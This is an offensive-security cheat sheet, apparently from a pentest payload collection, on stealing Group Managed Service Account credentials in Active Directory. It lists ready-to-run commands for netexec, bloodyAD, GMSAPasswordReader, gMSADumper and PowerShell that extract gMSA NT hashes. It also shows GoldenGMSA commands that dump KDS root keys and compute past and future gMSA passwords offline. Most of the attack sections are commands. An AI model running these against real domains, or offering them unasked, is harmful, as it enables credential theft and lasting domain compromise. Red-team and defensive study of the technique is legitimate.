# Password - GMSA

## Reading GMSA Password

> User accounts created to be used as service accounts rarely have their password changed. Group Managed Service Accounts (GMSAs) provide a better approach (starting in the Windows 2012 timeframe). The password is managed by AD and automatically rotated every 30 days to a randomly generated password of 256 bytes.


### GMSA Attributes in the Active Directory 

* `msDS-GroupMSAMembership` (`PrincipalsAllowedToRetrieveManagedPassword`) - stores the security principals that can access the GMSA password.
* `msds-ManagedPassword` - This attribute contains a BLOB with password information for group-managed service accounts.
* `msDS-ManagedPasswordId` - This constructed attribute contains the key identifier for the current managed password data for a group MSA.
* `msDS-ManagedPasswordInterval` - This attribute is used to retrieve the number of days before a managed password is automatically changed for a group MSA.


### Extract NT hash from the Active Directory

* [netexec](https://github.com/Pennyw0rth/NetExec)
  ```ps1
  # Use --lsa to get GMSA ID
  netexec ldap domain.lab -u user -p 'PWD' --gmsa-convert-id 00[...]99
  netexec ldap domain.lab -u user -p 'PWD' --gmsa-decrypt-lsa '_SC_GMSA_{[...]}_.....'
  ```

* [CravateRouge/bloodyAD](https://github.com/CravateRouge/bloodyAD)
  ```ps1
  bloodyAD --host 10.10.10.10 -d crash.lab -u john -p 'Pass123*' get search --filter '(ObjectClass=msDS-GroupManagedServiceAccount)' --attr msDS-ManagedPassword
  ```

* [rvazarkar/GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
  ```ps1
  GMSAPasswordReader.exe --accountname SVC_SERVICE_ACCOUNT
  ```

* [micahvandeusen/gMSADumper](https://github.com/micahvandeusen/gMSADumper)
   ```powershell
  python3 gMSADumper.py -u User -p Password1 -d domain.local
  ```
  
* Active Directory Powershell
  ```ps1
  $gmsa =  Get-ADServiceAccount -Identity 'SVC_SERVICE_ACCOUNT' -Properties 'msDS-ManagedPassword'
  $blob = $gmsa.'msDS-ManagedPassword'
  $mp = ConvertFrom-ADManagedPasswordBlob $blob
  $hash1 =  ConvertTo-NTHash -Password $mp.SecureCurrentPassword
  ```

* [kdejoyce/gMSA_Permissions_Collection.ps1](https://gist.github.com/kdejoyce/f0b8f521c426d04740148d72f5ea3f6f#file-gmsa_permissions_collection-ps1) based on Active Directory PowerShell module


## Forging Golden GMSA

> One notable difference between a **Golden Ticket** attack and the **Golden GMSA** attack is that they no way of rotating the KDS root key secret. Therefore, if a KDS root key is compromised, there is no way to protect the gMSAs associated with it.

:warning: You can't "force reset" a gMSA password, because a gMSA's password never changes. The password is derived from the KDS root key and `ManagedPasswordIntervalInDays`, so every Domain Controller can at any time compute what the password is, what it used to be, and what it will be at any point in the future.

* Using [GoldenGMSA](https://github.com/Semperis/GoldenGMSA)
    ```ps1
    # Enumerate all gMSAs
    GoldenGMSA.exe gmsainfo
    # Query for a specific gMSA
    GoldenGMSA.exe gmsainfo --sid S-1-5-21-1437000690-1664695696-1586295871-1112

    # Dump all KDS Root Keys
    GoldenGMSA.exe kdsinfo
    # Dump a specific KDS Root Key
    GoldenGMSA.exe kdsinfo --guid 46e5b8b9-ca57-01e6-e8b9-fbb267e4adeb

    # Compute gMSA password
    # --sid <gMSA SID>: SID of the gMSA (required)
    # --kdskey <Base64-encoded blob>: Base64 encoded KDS Root Key
    # --pwdid <Base64-encoded blob>: Base64 of msds-ManagedPasswordID attribute value
    GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 # requires privileged access to the domain
    GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 --kdskey AQAAALm45UZXyuYB[...]G2/M= # requires LDAP access
    GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 --kdskey AQAAALm45U[...]SM0R7djG2/M= --pwdid AQAAA[..]AAA # Offline mode
    ```


## References

* [Introducing the Golden GMSA Attack - YUVAL GORDON - March 01, 2022](https://www.semperis.com/blog/golden-gmsa-attack/)
* [Hunt for the gMSA secrets - Dr Nestori Syynimaa (@DrAzureAD) - August 29, 2022](https://aadinternals.com/post/gmsa/)
* [Practical guide for Golden SAML - Practical guide step by step to create golden SAML](https://nodauf.dev/p/practical-guide-for-golden-saml/)